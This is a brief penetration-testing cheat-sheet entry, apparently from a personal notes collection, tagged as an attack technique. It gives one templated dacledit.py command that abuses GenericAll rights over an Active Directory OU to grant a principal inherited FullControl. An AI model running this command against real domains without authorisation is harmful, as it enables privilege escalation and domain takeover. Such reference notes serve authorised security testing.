# dacledit
#plateform/linux #target/remote #cat/ATTACK

## Abuse GenericAll over OU
```
dacledit.py -action 'write' -rights 'FullControl' -principal <user> -target-dn '<object_dn>' -inheritance <domain>/'<user>':'<passwd>' -dc-ip <ip>
```
